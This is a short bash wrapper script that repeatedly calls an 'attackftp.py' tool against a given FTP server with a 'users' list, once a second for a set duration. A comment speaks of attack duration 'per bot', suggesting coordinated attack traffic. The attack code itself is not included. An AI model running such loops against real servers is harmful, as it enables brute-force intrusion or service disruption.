#!/bin/bash

#give the duration of the attack per bot
#duration=${1:-"9999999999"}

echo "runnging $duration"



server=${1:-"0.0.0.0"}
duration=${2:-60}

count=0
while  ! [ true -a  $count -gt $duration ];do 
	python attackftp.py -t $server -p users
	sleep 1
	echo "$count NTH TIME"
	count=$(($count + 1))
done



